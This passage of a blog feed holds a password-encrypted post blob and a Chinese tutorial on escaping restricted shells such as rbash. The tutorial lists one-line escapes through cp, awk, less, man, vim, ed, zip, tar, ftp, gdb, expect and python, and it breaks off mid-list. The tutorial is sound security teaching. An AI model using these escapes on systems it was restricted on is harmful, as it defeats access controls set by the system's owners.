df5160b7395fb6e4ddded280bddaa590b1152cfc2374bfad6fe1a5a303e8fa2a5f83e9be96311b7a287fb6c1a3d9e443bc928aad4f036576ec1d05c5fcca9ae828c51c465dff391551ae9dc98bf3601464f765fd9e4b88b479154756171354dcdc03431221d4c6f18d1b9b26572223d60bcc2ab8a291c0a54308069dc0913de05652de7866bad0e5467d4f1b14271a97d5d765a881c749fa1722ffd216f193784ff6649ade1bbbda2fd95510b5eb6e285b10eeb9ab7709b2b2c688d0a807d696ed3163166348791a9ef015efdaa08d0ca1fc64166ecf7dd69fd3ffc7dc28fb6f3acdc0098487cec71769a637fd5236e74177a21ed488eebd463735f409b601093a46e095f4ec1a8c5efe5a587c7c0d53548053a32aa0eeefe9c7dbb976023a2d18dd971cfdd7fa13c7b170e03a6e3c95a089349ce0c2fa3326a62957cdf622039f16d39465cc3b4b0dc82945a3c3efdf77c4f656fc0bdfa746c5930b478fa65f7a7f4f7fc155c8ff08faaf92495f78ec9ac5c3b4a637b27f9e19879b1844f3ec8f37fc4785d7fbd8fe7238c2f82941605b94668d828fe1c6bbb154afd67ce1ed4140eb9337b949845379d1a67cd2599f63e402b342967f04fd019a90904598271f70d20bddd104fb91b3230890808a1a602f226ee077642838c6484b14c244b4a738b637f53d38ae5dd95b5adb152142063ea737006c8f182eb57a0eae6bb35fe1555795e1cb92c6a9f04a3ef3161316647a9e83991288c189c4315dcf43f6d1dccd6f075da84d7a9a8d031046d09a4e9dc543358b8525c19d7115a417e4a7a6b58002a282d564d442fea7784c6901300ac562ced04017582ba55e9a97e6ce99bf7f8eb12c8b352431f044ea60ca107215cd7f2b2869e200f6445dd1ee74d89709385f7d1ed68d374cb748697e145f4ebb4f8260c3c31f345fa19e424223fd69cff04e104b203ef7af70004eeb44b294e57afa95c16775c69d0c421aa32eab1261c208df2ca5681c2c0b3f8cb580dbb8f7339977109428fadc209e2735dedabf94a8fef5394916a79f126bfd9f94a0d8b1b92870317868907d4d39f512b1c5e7872796a69be63e5d0675d01f1d8e0b1090300b01307ba02cc2d7bfcdc454ead1b196902bed23946dffa0a2513778f5eb4d27f1b8999f20c5cf4dfa18c6df296abc7bb950f3eff044deed2a37a7bd4b70d6975d5b7e6215717eabaac2e823c237b6f2236f1254f788eb1d48be7d03298a36063a3755cbc8c6cc12aba0b4c0c4a87906c9f9558eb29b245eed46935a26b079df7e3510504f598aaf8ff763e1573d78c426136249d7e88414572e5109fc9f001d28b8c6a67ade4d81612bc085d858f05e4b67f1f3bd16dd6a65686977f7d7189c518fb99f03e9d687305f17475cd03f74e1ac52fc37d067ab2c093f8754f5e2d81526d3bf0f854dc9b540da95478e80e8ccc38967527a90f814b1d07c19bfab2973b6ff4a2cacc83e26eb910bba67f0598fc8bc7529dc06e39e664ad82c411d18fe48503a959ba913ce015737b746e08c6974d9b8a63e7058c188070c146a30c97420e7f0ad00395d93e3a6e6098f5c2e2e8150a8c73d97249a0d6875623890d9412ccf380789ae7d28a240c65bfe4ad861f02af04121c86fcb3730d07d13d7b1ae8c1fdcdeb0e636d97fed617268c4d9b7d9138c68099e845fa4254a290038d7ae83c930624b96b72af15481033008d955645eb2da1c2f28ceb8b48742a93c7b98c50e8362af6ae7352c4e41ac274be55b19e4f351f332492ee53ef19603a5542ab85949654d932deb21b1b951334b9d08c3e8dae0338fc3183a4ac2dfe820cfd199aa1f3e56f3d7f363f19d28a18ee39c76f95dc7f1e04cc76d69fd244088443a5f42d6718773537e660fc65b5627cdfbc23a16c56acb223ff70f8d99cccd86620cba493fe315e9a12a9353b8ad2a7e309c2ba66ef343b14a51751e1e725389f1d690687039ec542fcb26612aa36d9aa58e9f1545321319754f244a0f252176c29753f373258391d45f14e5b6f0f7f80603ebc58a685fbedcad73d759f3ddb688cd27658ecf75f8064498022b71f515eec2331874fb08ca13c6b4c6b9e5c5a66ae771e6087cbb68f8a4138fd9a7a9fdc40984b3d9c2875bef5db1f236176b5e6ee7ac61dc2ab87116431b5e05974edf19c6dec888262eb7e10b45e98224fbd6de77f034c39b5f115168e2836cc46c2655334d302f3c474c644700368f56cf511a2966f2b1942c1a392b6c28f5b72e55c0dfd02139ab90c7cde2f8ca25a2b48cbb66488f114d70acd2d444a94c5fa604694532491837ab2caabb062658df6a87c83ff328564007d4ed6544688e3e3df0f07f6a9e03c01d702c1ed167d93da6e1443e55b3b53bf4cceafca170ab23cfd0ea404784d1b0c00b42a1859e1e227d0161b2f4942ca9b680dd62e6a468ef21272bb13e5c879e8a994715dfcd354f0920ba921d4cfa188ff52da286241f9c91e7cf5727636948a70dd5d7502efbc08a1eeb407d94985e72ee9fac637f7e9940581c29e95547e8f2b1240b140e6e7d7ae832552843599b71df15126e480a123e1c4569b473cd44d4433649447220395c0e06ea1a9ad891bb0c9b7b989c99acb38ff44b4b262c5d384795089be97fe2ec1eb0cfe7843fad997640708212ae3a5f7e39b27706607a3db32d01e780017768ab22457dc1c8a3535ea7351cfaa9d60fde3fce5be9ee1c9d343d9405aba9d9b06c1477827beb97df336a3896b117d30e55d3336abfdeb6505c1e8af9fd1c3fce5ca765d6b86205de83eefce1a1e2b447e2fdbd6a4572884865ef7c9db156b61bb3fb1e82965107a90b6a577ef43eb023bedbf99464d2afaa14fd0454eb729baef39c37dfd16aad4b39ca6b8c6ac1cb48dc5476590fef23ac25da3bcb89eb7900bce15d2b380160406d6ebc0333930f0915647db5041aa126d373bff64e50abb078ce298c2f9b6b410e1b98c1aa33d7948eda9255eaf666202786bc7cb4e7f749d668966ea48ef0246f0aa71511e9637cae5826f4db1ee052818ec8af843672b7e60113a8b328e5dc8d3a634b65a18d87d1252d8bf7ad77c0d6c9a7dde5dce4fdbcdc2a7bfeddec4304bf7b3f5421ef6d8a12bae3bf477a6b4ca9917177d80b72355441b27816064662bdc9dca5cf21ff6aaa868aac57c086318fdcbae3902ad5f6ed1a42c2c4ce35e7ce6fb3794f8658ae90b44917ef9ab7b150c6bc6ea768ff2a9118e779cc718575fbe86208663d2e60e28371cccbf37c6a540072c0a88038b0397ecad2d62f52a9aac0f542c9754018792b85d83d226c30af6338c55a30fcb1b1d90340bfe9ca2111cc210a16896039ab7a8833b0e47a923b924a4debaa8405afa43575afbde0d640bdccd741412a5290fd578193fb770c7930a86923c8186e59758894bfe1a648ab79f3e1ddc41dfeb24fce440285e32ca31a36366cde3a276fb23d7620ea8a1c8a7fcdb1a900c5bbb39561b9499d48bb02ffaf77b556b8a47bccd54a72d89b068766c4847eca20128a954bb7af0309b4a66c0bdbe8dc8c03a046283c257711d8a7ed70c978c69c025f30bd6a7ef64278b429eb555c249e2710c1fcdfdf35df6f8c386165ffa434563227ce3c62ba98aef785680f4a3cebf75a57dc24a04f5304d468009fb2d6f1f76cfdc3a5116a4facc90d802b5b74381262dd71791b8877d2ea8fba71df0f9417720b5f7c5005a13a4517b5f363a273e7aff0e649e2d3c2acbcba008d1f713e49fc302609b6af57e78cadb352d3f95f13a790f9e0982aaf1d0663cc20babc62522485cb4fbf790c1ac164eaddc4488e4fc85d14c19474be8f80bece0099bb1920855ecdb43db15fba8a27294c075e393641484a9aa4bf72e7b2761b3b46af085d73cbbcaad6faec8b4d15abbb22855c2b72341ba5188c2ac38558396c55bc18ab7092c7944a7a1f0eb54cb61e9dd1ff47f0cf2146657751292cc3ea6e0dacb2803d5a614a6cdd975d61fcd3dfe134e9b75ff39909a417d9c6a0c9bf3279a884889e898fbf46da7fff360135e01c60ea5f80654f0ee81aa0e87939f32a0625d654f9cd7d05b026f4aa9289cc2dabb7496346b64f2c8d92796c9414c1be427924c38eeb915144e891e47cb252d7ce7f941be0e48dc16e7777039cdad074138a942c5485316c48cc744655fb059d6077116beb704f3c34a7af1bbd3b9d8778d590ccb83390412e2a5f357867014b5949c84f11f921347200d61bddcb56ad50b1ee4870c16f988f50848a842819703bee0444363410ab9d61d82eeaf6b3889491d63dda351780a8e38126c4f93e1db57dbabe8edbc57790e83993f800a8ba9046efe91f3104f24a7082f46a9f5f516eb5a506064b6358652d6b3a62f685353ad4b94b7e412d80cc54c724a786dbce9a387b054b161878afc199c7bebac0312fa9d7e6c491cb0cab23c36e9a511797145e8c34793d776f78a029e6fc24959e893b8197b9a0a885b4f52b108568eb76906458a7582fec73fc4c8b12ec6f93957d9e321dbb33f70295fb251041dc827fb87daf99412cca66fe3e4c96bbf2aae105736d342ecea8179bb7e9846a5d55cbaf685f6d1796675bd7472a41cf6b20801a465d5f47e99e36cc0d171919510bdd05b5d9949722eec66a56541ffe574e21912dfffdac2483b6a4e5b3044f1cd07d5e8d6fa37ab39fc8a6e71e51abcf04346f45f9b20d1acfa278dab1bdfb5393dc562e5ad9cd54064961a86c79a9b6f63d68a6356309c2078bad5fe080428dceff0874ff97600a97b23368764adeb81fdf8a6fbebac0bf7ef3ae5b4f3b8e2be0526b1905c303e719d366069969a050c01ca1f05df736b67bc3d8649ba79f8764c8e218a9b98f1121e66cb019dfb5180290fb318ce8468c1db6b5cd1c4ebb9790dbd3b4a2cbd308a588d683ebf419513a25f56fa0cc45a1bbcddc30d732d5af1c4e631c23dcb3e35c98a86cdea6c4daa5229925a2aad83976843b65145c72eda407b07f706acca3e566a8fdabe5c13778e1555f6cecf809679eaefa482b4927a375aa2797c027a9ab79f55b7434cde0a7f62faa651c98217444f3ea16673f554b60bbe337b5d32582f8db9d53f618755e217a7649ded253afb152f5a7a996a561f93be17b80b76a07703448041d578e290781ead53a58d2178754416c0f1cfae8566c2099f844056a230adf40aa75f18d273162ea04a6699d62f41b31b24acefc21b52b027bde2aa91aa59a720d193f0ca98624eb0e5f10b10bb4c665ea1d55fb110fcad167160641b0f43905cdfe2783fdee74ca66d2942f2263cb8913e8e3ae7ef38b8a8542e96dd2d07597a13453e46222863a129594987f2dbe87bdb100a8992ed4c16f093b52ba95df5489c5b6430446a412a174a39456d5a509576b3f4ea18557982363df87dff47ad4a0940300181faa402840e27689b9e79a15bdf97891eb3041fbc3c456048fa9fcf464580588e134c17c8117e07f2835210c5a4ad4b277a60cb7cbd9e9fb0c6fefa136ef4e5d328b53b025d7bf299d2e47c1684de2d8010808887bb68b82b909d333e9380085dc42b5f90b995a11d444533f588d43092d6b656027ac2683acc8047414b2a07d44639628bed64a34837efee22d8e908c439793e1adf8c1e111a7a4940fe5d7f9740b4694cb20971f85c33d01f4d01052823efe22cee6fb7ba87f45c8896179662bb410bbc5655648563257e40d5b3d3932678a6e6887b76fcc385a7132db4a723eac2bc6d029b3d25fa2e00b743ddd06659fe0b85e1a2f7e1e414d42a84dc2adc7d532bbb36a83d12345d2ff3190d939306bf24df49dd06198d9411723444c50b014a7ae04d25d79bc1faff95c8b2fc976cc2d47932faebd89997399e46b9acda6df8c3c15933c50bf34d47d6da17312698cc8f19ace00d7bfe60fcddb46c2556e33864a2b469f2fe9d2d7af57bbee760405308b21ea2cb2dd26922863a6df50ddf13adcfe43e0b0aacd37515c7130e96e8f343cdccf5c6c0291b1aa1e0b3d14a57cf49dbaac8a0f2909e4dfb9b20ea144057a8e2d8502f9893521ba0a12a265eddf991c4db14061a4a558401bb452d004a16b296b5a2532ffd043c5e531ae3e73f2b58da7ae47ac1adb768da05558dfbd2618904d6cdfbb06a4f6c8fddb38fab046f916711673b2f972bf6b9247cf99ea69a5a0b45cf8d72df7c4d10fc02ae3f48eafc1d8cb2e0d5124f8386f37586c32cd139651e9dac81462e2a7ebc4a0ab82cb6b347f6b442370781b6b54fdb85887623e486dbdb05ce2763bb64c976589607af8a5e4710ddfb8c7007536066f973e7f605d3f013abd2a857dbaef434007e9dd5de6bd56536753060ae7fa19a6da474101421c90a059e737a360bf2eefe77128eafaa4e807770fabc6c7c48cdf9cd6f88527c1264f7967bc879535cc6bf835f399bd64b160bc00c98efcf8c31cf5f82121530a5da8b83709bf86518f46f9cea7917eb391cb8df221887ef88c344699d7e54b030e1c9d4362d85fd7a5f2608b189d50954f2913cc2313df100f0e53cac26f206f711d4ff773b800b936be0e16b23e8252298514c8ad7174ec10c21981c36a885016b846f7a2f0b44b368dfa77ad6b297044f00e8c4879f20ff9183e402023cea6682fc43bd8856fff925d50ff7870f24c77e9c38d937a180bc40169cefb62ed6bb6ff98a6727aefbda817ac83ad2fcf0a05fe1e67bf8a04b05dcf60ffe9f5ff97f4c50f3f2b63fe29edf2d4ee9e24733fc4c62def9300a56ea803fbe9f7eca5e74e50e0f9ef1ae583b4d9fa8b2cb2c8b829f22a5a0f0ab0cd6fa082532bc46967e330906d71e76b8c42741e5b87489fb80cf36ff66e53cec78c9d53a8831c3dd2882ca7ca776b379ff71a9c4fa802612fa5152e81b1beeaa882997d501a62c05e47b07d8df413e64b616b06724abccae9aad634e6805559f863a9908ac7c6844e0a78839d9ce2ff10ea0027b0d5b104c4c54f678fccc9190483fe6eb32448d62de08723551f9f36ee9e6b92144585f171f1e2a3b5581301df81da7c8711e0b71c48f355e4e2164ad6593f936777166c76d4b75c7a1812e7bb25286186ae236a0e6b566bc8072828dc46d11938e61c299437b8f6c1370c7811a7f503a8de7e6d13081982fa2755cf7896ad57de640d81b350957e6c5511f3a303c9284dd42cd7623ef454366b7e56b717d64a126eb767dbf54eb2d7e7c6c411c5167224710ba4ea1416722d1b56776cac33b2301176fd98ffc43b577f56c6ff29f615b9b2522db1e6a676907c77e84b5982a2ad6b851fde6ac733c830ceaf9d580441a777ffa9d934b13c69cdb47178fd544f84c737d62b047fa1471640dbe45b3c8fa031bf99a59f5714d86b30277eaafc164f33478affae4c49feea48ef145299f9d1753b42dc738e01b19458036e4569153fc94151cc43e19cc9aafc6b5c8c93f7377a65885d2022e1d675e9cf4b09370c57d805ce5044951fe36f5d01b404717a62446cb031053de2d7556c5556e7efb27f3b4e72770db3ce8b8448a5edf0dbbc176b8df5404e74cfa938f9fe2fad163418a366e0da27b015e10d1fd7557781dfdd8e49b45d982d9ff7422736d1a8b422a1cd849f2d180885447e252343d1309b75ada8b614c5d79afc37ffba9b8d86b2b56c07940219b72484556ed9a7838329bfc699afa7aa1fd0d54cd35217bd5f4dad12ec47839b26eaac5b6538d923e6bbd0de3a9143c9fb8cf6429954c7cff4c600d0925a3f22dafef6444838e445b5a844142962190bfd905a97dae98f38908adbf4781a73bd41c03bb2386eb5ebeb0120eb2a11912f7b645cbbe51d2bb81e955571b36e7af2e88a57d3a0bba3c46221a5064b7f5017d9356eccc3ff84adf45da2520bea1c0244bfafc458c8a957c406284b5bf766f2ce9aee49b0c742cd75a2b5d85128280472fa2f5dc61f706bad650bb446dd3380613b9d36af71e0a1432d4d94909e73f056c576cdc7274832d9dab54a6d49b0b660244b6de8ae6b50a2f3ccf5ee4431b94bb1247c39de3a2ea7f19e67d5555358d2c19835e5f23f8eb4078456e0a05b3d4a4dd0c8348584b845387cff6416b7e46c73db5cb824f3f19300a3c510340b0e47245d885a69cee27d1463da96e80675f22c06e24c3b32acbbc4192e072b06d42f6cedff5c18758d0ea5b8e110ad80350d5a00d3e3594a3fb95113039413e1f2bf18368546c2d9f672695d3130ef216bf76d25890c0c794d8fbb2ee886f8062004839bfaaa70942bb7cee566d4399ac4290f5445772a29686b3a1a0974fae1eb19ae0d87f2f53914a1ce5220a67954314704c5715db3304d68b2b57992f5f25a759acc9fb447cb210f881a46ca80be5e621bbb9a6d94f67cea2e207856de925356e064f8134ce909e1eca9cc10148264c297addd5ada15ee6e0c81c43f0be68f829086ccb6e950ef45332f3703de5bad50559b73d427ef2da948d1cb5697d0b3a581c86517d43c91a8e5869b6c11ad8baa3ff5afbef17ef279f28cb079792f9c38a8aaf17deb540cb04cc610c18c2bc1184459f4d440ac193742ef352e2a63755cbbd2215f4752300196dbf84f9348dd924fd72f936290ba7b480f367461832ad3688602887e91e7bc99cd1c0f000b4bbe0dc99ecd7ab06713a4166f4bcc49f5efc7e989dd290568d29e6673d74e3972fd4b33349091376a71f0546f730c94dfb637d616d0840722d823a4aeb09a29ee194dd3a2e12a74d642cbf40a70a7331e7adade6d7ebdcdd6ef62ed37125f568a12bdbfef01591ac53b6ebd5640ab387e55b1a08822d2d3c5d1e0bfe3832531932b01191b19f5ede52872239d9f3b106455677386fa94010ca77e244d98e3bc5347596831e9b01dd780374006a453a91535dc8f1a59828bdacd6003e4ce34a6cf93a2dfc2b5d88445b76c5fed4a635bb7740e487c3b6d3155cd7cff6fe6b3745fac85d40e30e3047b14dfe8609a514b5d17ed305d8952dd83981a1bc6586efe6563b2c682570360ed1085bdd5d394384ac4b54444e1c2bc4047de65ebc9deb59fb842376e2d997d5d39a22f57193d5852993b587a8525a9947f67a6f52eec4bd0acc98b1d188ab7096dc4afe44ea21ae02eb15027859003bcfe7c9c5dfec4217f8556d16f5d2ee0bd96c21b2f6c90e8b4ed9233855fbdc3af1e3a51f84f30d092ab32ef604b6909ace7244b8810ae28761f8c12f7e7457327d5bd2b72d31f7d80eb3f42af14227ce8c4236a97c013a98a84963f8021650db0f1cdfb90ca0008f27d82a4e7caa014bdecbc569a0c67a62077a2705c52929ebe11add9b0d64c5427f579a752f774da4036b5de95306e29858d5bda5c5341f91fb09b0300c7ac390f1bb4f245762d4333b95c023ce108c2e93e5f0a449a3ff8b86f255fa59982585b3f764f06dcd20f5e73d19664e9146d661fa84377dbd807b590ec370af345ef4ec6f473926e31d9e545fa1ec32bc8908f75201ddd34592670937619c37d61b6c25ca30a2698055baaec181b736989054c25cdaf27fdab66e3abb52a8242eb634042b98cd99d6d6d2efe67f10a0ae1d19993b202d741eca210850d4cf3c5e3aa0a628800a645bf33c7a35b2767f51c4d8d044647cb34d72d1ebe4408b40b53187df3315fd9b734763d360879485a9ca0e1e3eeda6f86ab519e9d59b78d239809a543e24be677058c01f4c0490aa4c1761b13dcded5927de5634afb5edab311fe88f620301a49d6a2018c7c0c019c5998244c11341efab29241885557124b3fa17d84679ae780da2c39dcf15006c9eb5e9d49e361d2fa9843ae8ffaea2664860dabb22ba41d20be829ea965aa229fdd09c11ce8891e9d8a8d2bc32713738dbf6c0f84fc8c61d5fa2f794f8767ad6a66aa418dfbe6af5b95549ee2305d1a03f9b62238e02d8c5cfb37b1a95e96131ecaf7784bef637dae5eb077c3e3a0762677db5753e42c301b94765b60c6d0c6f04554854308ab44d646b051ffde21c0527cdcf562ed44cc722133ff0c47d9320990a648fd00d49b74ef7904f315c1b75ac0f0d9ccff6b813709c7c97a859e6ab5e1adaf82d7ff42ec47a057306161bd1976f6dd11c6d8d1c0d36949d0d8d36c2203136924e39f41e16adf3bfa64b5be81a337bedd69f4296dfae816a41221bb89cb396ac2f84c98784f9abdc582e8784a18541d051d929c90b23c6b708b4a89d6f9c562cd8de495a6816be0c344675f6e6099f8b96d041148f23a1781ae55faa652679b779bb60f21c4cb8f5fbe4c54d6f769bfcbbef035f43c70919d5730a993e92445ec360e187afe31eb66b2077609780717a0076da75a2995375f9d830a51c96dedc1f3134ca84001a7c8460b7c2ebc627c0ce8dc3cb7ecc69b0d4382936d03b419965fa8d09973db0abcb7832eb143384f272cbf95ed484a269822c1c8fc4bdf267dfde7c1862ac60dfd3f56347dc349622fa6bf8e7723817908b7ae639d066c28ab556cf9cecbdfc3655dd403954c4cb2cb4b6712f57d00ad4f70cc3b7b4880adad164ed7e431c2301fb854cf2cd3af3e457c5f781c51c145fd140f7abe9caed418db1e0fd350ea8aa611b519707ddbafa140327f688cea517788f428f9c9b89dcfb6cd78dfa1a7d37ad6ce44a95c2e47a51cd93328931aaa4601da17ac792787115fcdc3e1558978bde8a8594d5cbb19772f8c8c63f3f319a4fb71048b40915efb1aa1608021998057a47a958f6fb670064605ee056bc681e4e70a35b910df4c5722a6da3281546b368bef169ffb348c234ae6344b223f8c88bed6c2e1b7375cdfe79946d1dabb9264d9d778d441681b31b5f3253bb684b2ce3f3da770296e02bbfd5d90915acafedaff114fb8230180146ad65b77a9c00342fa54fe9729e516d445704d7d34b6d3a3a0187056db2d328e232e84db40fc473ea9f322f69de562595ee11524be2b6af9a136f001b537e2f22a6ddbada940e268a5326146ecff543e43306ee08cd1050654e828d29100def0b7ae119e9562787787f524d6125daa6257c424c0ff61c449486300a0010d0839130cb543ab8ce2b192def96349d633ae716d8b9b5c90ac7dcd6812972c0b1b22cc5ab53f92f95fe8f4aa3c7631dbad47bd9148b8beb82842a25f18718a2c6142ed9afc040aeacb68a2cb4720373938e1cb97184e2163049a3dc8e4e72b1c1c7cce219f5de5a762032083509b191badcfba7295317cba8e852c0707e8bafab5716fc86df4013d902c6e69a3e068d98af9519ce96bb035e867918a69d63d8dd73204b1c84636142f0136f73806ffbd2b7960ab82ad0f64894c1882398c348e040bcee9a4e7c9713cfe601c838807aaba8ed062d6e1b10bc8214826bcfa5db6e48f53af9a9d3645d38a8d8fa2cec51a51f2e73b2ad404b9a6374301754a0339d3c97216f3936d8f1a50e7851160e9db245f9f177d3dc0102427385b350b13a51dde3d8d69b3eb19814d749e8e32a37a6531cffed1e498008cab1909ef743e1ab0d1a299426138223d85ea9064d82ed781000144523690b2d7e416b75f4c0ab9dd591ba99e92e34d4b8c765b9d5e00810b327ab968b6f0c7e202cea07cf2221182f31bf762eae3bd56fe39d0c0eb1902eb719d1e1faca6397613419320a47f52ec88af5c6b5cf6e3bea1990b450330cd15e921e2aa9e4899a864b347b5495f7719b06ff837b018eba1ac06ef10d820aa86bd70fa97ee9b73d9b97550b0d3bb58d73ac20bc0b6a801efea0d16d39eaab9433873a4beab3888630cc8baa33606966bbfb48e3ca4782b5b30eca027bf8691f790d983781e1c44a872d59906f0f0abc5a88f3810e49b087132f5120284aad8ac06bce4ad5d17ec3817dedc50bd97c0bdba9c01a2d38e90cc35f0050b1f592a96ac1deb6f9de985ee3a109f69cf0060424683c0d854882ec6e6465194579457f4658462075b40394a0665f8e54476441af8ff93aa3f5c9cf8f4d45984ddf00618d3852455fb069e4e951e2c8eb3e6e51cab3eecb359d0b2b7dc85a6b0d77c13b204fc05d1b47b3a0b6deff83f39038e5d060db23bdb6675b01cf48c57ab1a9a41a6ab009c6ff7e92ca4b261183c08d1c45bbb42b0cd158699344609c7b12dc52e042d69f45c8d785fbb46183c35f655074f2d8ce6aff779e18b82389af8db7661dbfab0a39f77a83167f258c5e560191fe10f896e23b7e3ffe772194328f750b1c77839e13f469ca2f7faaa8f7ba69776dd4175a4d52915b3073dad69cd81655129b550503794bf7aedbaa52151157e401432ecb14df46d58d50293746d05a199f7368f0dc5994771c5355e9a701b43458f297478727489d9286b8a4ae843b2f5ad6dd88eb79e4ab1623c717b8b4c7d7aaedee54ff82440b4896e79fe6f7575baf42e5813723f86ba2acc06bf530d104f2eeef76afa93d92c16c103c2a38673b1d319fd00c8e7e1a5b5585d87e64850f1bdf991bae3fbe1000c585669b6f71701ae162d825a774260f282ff9651a06241c297b2db7fc1bcdbb34ae9e29ce210e516cdd39ffdc60a9fc14ccf194d27966ff7b5c2b011c62d997d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RestrictedShell</title>
      <link href="/p/1712bfa8.html"/>
      <url>/p/1712bfa8.html</url>
      
        <content type="html"><![CDATA[<p>Restricted Shell是受限shell环境，所谓受限shell环境，指的是一个会阻止/限制某些命令（如cd、ls、echo等）或“阻止”SHELL、PATH、USER等环境变量的shell环境。有些时候，受限shell环境可能会阻止重定向输出操作符如&gt;，&gt;&gt;，或者其他使用这些重定向的命令。实际上，常见的受限shell环境类型包括rbash、rksh和rsh。</p><h1 id="可用命令绕过"><a href="#可用命令绕过" class="headerlink" title="可用命令绕过"></a>可用命令绕过</h1><h2 id="字符绕过"><a href="#字符绕过" class="headerlink" title="/字符绕过"></a><code>/</code>字符绕过</h2><p>不被运行的情况</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210103715084.png" alt="image-20211210103715084"></p><p>允许情况：直接输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure><h2 id="cp命令绕过"><a href="#cp命令绕过" class="headerlink" title="cp命令绕过"></a>cp命令绕过</h2><p>可以直接复制/bin/bash到本用户目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash bash1</span><br><span class="line">./bash1</span><br><span class="line">cp /bin/sh sh1</span><br><span class="line">./sh1</span><br></pre></td></tr></table></figure><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210134151598.png" alt="image-20211210134151598"></p><h2 id="less-more"><a href="#less-more" class="headerlink" title="less/more"></a>less/more</h2><p>在末行模式直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! &#x27;sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210140813076.png" alt="image-20211210140813076"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210140915460.png" alt="image-20211210140915460"></p><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>先执行man 不能显示完全，直接输入<code>!/bin/bash</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210142059834.png" alt="image-20211210142059834"></p><blockquote><p>git help status 同理</p></blockquote><h1 id="可用软件绕过"><a href="#可用软件绕过" class="headerlink" title="可用软件绕过"></a>可用软件绕过</h1><h2 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi/vim"></a>vi/vim</h2><p>在末行模式输入：<code>set shell=/bin/bash</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210112621431.png" alt="image-20211210112621431"></p><p>在末行模式执行：<code>shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export -p</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210113722958.png" alt="image-20211210113722958"></p><p>修改PATH</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</span><br></pre></td></tr></table></figure><blockquote><p>PATH和SHELL变量很可能是’-rx’，这意味着你只能执行不能写入，如果可写，你就可以直接写入/bin/<strong>bash</strong></p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211209175427171.png" alt="image-20211209175427171"></p><h2 id="ed编辑器"><a href="#ed编辑器" class="headerlink" title="ed编辑器"></a>ed编辑器</h2><p>先执行<code>ed</code>再执行<code>&#39;/bin/bash&#39;</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210114635605.png" alt="image-20211210114635605"></p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c/bin/bash&quot;</span><br></pre></td></tr></table></figure><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash</span><br></pre></td></tr></table></figure><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp &gt; !/bin/sh</span><br></pre></td></tr></table></figure><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb &gt; !/bin/sh</span><br></pre></td></tr></table></figure><h1 id="可用编程语言绕过"><a href="#可用编程语言绕过" class="headerlink" title="可用编程语言绕过"></a>可用编程语言绕过</h1><h2 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h2><p>执行<code>expect</code> 然后执行<code>sh</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211210135444692.png" alt="image-20211210135444692"></p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><h2 id="perl"><a 